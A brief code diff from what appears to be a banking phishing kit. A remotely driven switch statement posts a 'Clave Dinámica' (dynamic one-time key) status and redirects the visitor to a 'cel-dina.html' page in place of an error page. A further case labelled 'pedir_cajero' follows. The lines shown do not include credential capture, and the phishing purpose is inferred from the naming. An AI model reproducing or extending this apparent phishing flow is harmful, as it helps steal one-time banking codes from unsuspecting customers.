@@ -200,7 +200,7 @@
                                 headers: { "Content-Type": "application/json" },
                                 body: JSON.stringify({ status: "Clave Dinámica" })
                             }).then(() => {
-                                window.location.href = "cel-dina-error.html";
+                                window.location.href = "cel-dina.html";
                             });
                             break;
                         case `pedir_cajero:${transactionId}`:
